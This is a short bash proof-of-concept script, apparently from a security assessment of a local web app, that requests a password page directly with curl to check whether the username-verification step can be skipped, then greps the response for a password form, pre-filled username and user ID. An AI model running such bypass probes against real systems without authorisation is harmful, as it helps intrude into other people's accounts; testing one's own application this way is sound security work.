#!/bin/bash

# POC: Direct Access to Password Page Bypasses Username Verification
# This script demonstrates that the password entry page can be accessed directly
# without going through the username verification step.

TARGET="http://localhost:8082"
TEST_USERNAME="test"

echo "[*] Testing Direct Access to Password Page Bypass"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Direct access to password page without username verification
echo "[Test 1] Attempting direct access to /password/$TEST_USERNAME"
echo "---"

RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET/password/$TEST_USERNAME")
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
echo ""

# Check if the response contains the password form
if echo "$BODY" | grep -q "type.*password" || echo "$BODY" | grep -q "password"; then
    echo "[✓] Password form found in response"
else
    echo "[!] Password form not clearly visible in response"
fi

# Check for pre-filled username
if echo "$BODY" | grep -q "value='$TEST_USERNAME'" || echo "$BODY" | grep -qi "value=\"$TEST_USERNAME\""; then
    echo "[✓] Username is pre-filled with: $TEST_USERNAME"
else
    echo "[!] Username pre-fill not detected - checking response body"
fi

# Check for user_id
if echo "$BODY" | grep -q "user_id" || echo "$BODY" | grep -q "10032"; then
    echo "[✓] User ID found in response"
else
    echo "[!] User ID not detected"
fi

echo ""
echo "[*] Response Status: HTTP $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ]; then
    echo "[✓] VULNERABILITY CONFIRMED: Password page is directly accessible without authentication!"
    echo "[✓] No session token or prior username verification required"
    echo ""
    echo "Raw Response Body (first 500 chars):"
    echo "---"
    echo "$BODY" | head -c 500
    echo ""
    echo "---"
    exit 0
else
    echo "[✗] Unexpected response code: $HTTP_CODE"
    exit 1
fi